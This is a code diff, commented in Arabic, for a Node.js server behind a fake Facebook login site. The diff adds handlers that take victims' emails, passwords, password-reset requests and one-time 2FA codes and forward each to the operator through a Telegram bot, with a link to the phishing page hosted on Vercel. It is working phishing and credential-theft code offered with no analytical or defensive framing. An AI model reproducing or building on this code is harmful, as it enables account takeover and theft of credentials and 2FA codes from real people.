@@ -24,7 +24,6 @@ async function sendTelegramMessage(message) {
                 parse_mode: 'HTML'
             })
         });
-        
         if (response.ok) {
             console.log('✅ تم الإرسال');
         } else {
@@ -35,23 +34,79 @@ async function sendTelegramMessage(message) {
     }
 }
 
+// ========== اختبار البوت ==========
 app.get('/test', async (req, res) => {
     await sendTelegramMessage('✅ <b>البوت شغال!</b> 🎉');
     res.send('✅ تم إرسال رسالة اختبار');
 });
 
-// ========== مسار تسجيل الدخول ==========
+// ========== الصفحة الرئيسية ==========
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'index.html'));
+});
+
+// ========== صفحة OTP ==========
+app.get('/otp', (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'otp.html'));
+});
+
+// ========== استقبال تسجيل الدخول ==========
 app.post('/submit-login', async (req, res) => {
     try {
         const { email, password } = req.body;
-        console.log('📥 استلام بيانات:', email, password);
+        console.log('📥 استلام تسجيل دخول:', email);
         
         let msg = `📘 <b>تسجيل دخول جديد - Facebook</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `📧 <b>البريد / الهاتف:</b> ${email}\n`;
-        msg += `🔐 <b>كلمة المرور:</b> ${password}\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━`;
+        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
+        msg += `🔐 <b>كلمة المرور:</b>\n<code>${password}</code>\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
+        await sendTelegramMessage(msg);
+        
+        res.json({ success: true, redirect: '/otp' });
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// ========== استقبال "نسيت كلمة المرور" ==========
+app.post('/submit-forgot', async (req, res) => {
+    try {
+        const { email } = req.body;
+        console.log('📥 استلام نسيت كلمة المرور:', email);
+        
+        let msg = `🔑 <b>نسيت كلمة المرور - Facebook</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
+        msg += `📌 <b>الحالة:</b> طلب استعادة الحساب\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
+        await sendTelegramMessage(msg);
+        
+        res.json({ success: true, redirect: '/otp' });
+    } catch (err) {
+        console.error('❌ خطأ:', err.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// ========== استقبال OTP ==========
+app.post('/submit-otp', async (req, res) => {
+    try {
+        const { otp, email } = req.body;
+        console.log('🔑 استلام OTP:', otp);
+        
+        let msg = `🔐 <b>رمز OTP - Facebook</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email || 'غير محدد'}</code>\n\n`;
+        msg += `🔢 <b>رمز OTP:</b>\n<code>${otp}</code>\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
         await sendTelegramMessage(msg);
         
         res.json({ success: true });
@@ -61,12 +116,6 @@ app.post('/submit-login', async (req, res) => {
     }
 });
 
-// ========== الصفحة الرئيسية ==========
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views', 'index.html'));
-});
-
 app.listen(PORT, () => {
     console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
-    console.log(`📱 اختبار: http://localhost:${PORT}/test`);
 });
